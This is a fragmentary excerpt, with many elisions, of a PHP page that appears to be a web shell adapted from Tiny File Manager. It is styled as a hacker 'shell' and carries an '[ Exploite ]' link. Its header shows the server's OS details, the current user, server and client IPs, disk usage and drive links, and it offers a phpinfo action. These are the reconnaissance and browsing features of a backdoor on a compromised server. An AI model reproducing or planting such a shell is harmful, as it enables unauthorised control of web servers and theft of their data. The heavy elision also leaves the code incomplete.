...
<form action="" method="post" class="pt-3">
    ...
    <div class="row">
        <?php if (!FM_READONLY) : ?>
            ...
            <!-- <div class="col-3 d-none d-sm-block"><a href="https://tinyfilemanager.github.io" target="_blank" class="float-right text-muted">0deay</div> -->
        <?php else : ?>
            ...
            <style>
                ...
                * {
                ...
                .link {
                    ...
                    color: var(--bright_green) !important;
                }
                ...
                .logo_shell {
                    ...
                    /* border-bottom: 2px dashed var(--bright_green); */
                    background-image: url("https://raw.githubusercontent.com/inek-shaban/shell-media/17947945c4fc695a50e52d069cc22e2ffe0f436e/0101.svg");
                ...
                .header_table {
                    padding: 10px;
                    background-color: var(--header_table) !important;
                    border-left: 5px solid var(--bright_red) !important;
                    color: var(--bright_green) !important;
                }
        ...
        <header>
            <div class="section1">
                <div class="text">
                    ...
                    <a href="" class="link">[ Exploite ]</a>
                </div>
                <div class="text">
                    <p class="title">System:</p>
                    <p class="desc"><?php echo php_uname() ?></p>
                    <p class="title mgl10">User:</p>
                    <p class="desc"><?php echo @get_current_user() ?></p>
                </div>
                <div class="text">
                    ...
                    <a href="?run=phpinfo" class="link">[ phpinfo ]</a>
                </div>
                <div class="text">
                    <?php
                        $directory = dirname(__DIR__); // You can change this to the path you want to check
                    ...
                    ?>
                    <p class="title">Hdd:</p>
                    <p class="desc"><?php echo formatBytes($totalSpace) ?></p>
                    <p class="title mgl10">free:</p>
                    <p class="desc"><?php echo formatBytes($freeSpace) . ' (' . number_format($percentageFree, 2) . '%)'?></p>
                </div>
                <div class="text">
                    <p class="title mgr40">disks:</p>
                    <?php
                        $systemDisks = getSystemDisks();
                        foreach ($systemDisks as $disk) {
                            echo <<<DISKS
                                <a href="?p=&disk=$disk" class="link mgl40"> [$disk] </a>
                            DISKS;
                        }
                    ?>
            ...
            <div class="section2">
                <div class="text">
                    ...
                    <p class="desc"><?php echo $_SERVER['SERVER_ADDR'] ?></p>
                </div>
                <div class="text">
                    <p class="title">client IP:</p>
                    <p class="desc"><?php echo $_SERVER['REMOTE_ADDR'] ?></p>
                </div>
            </div>
        </header>
        <div id="wrapper" class="container-fluid">
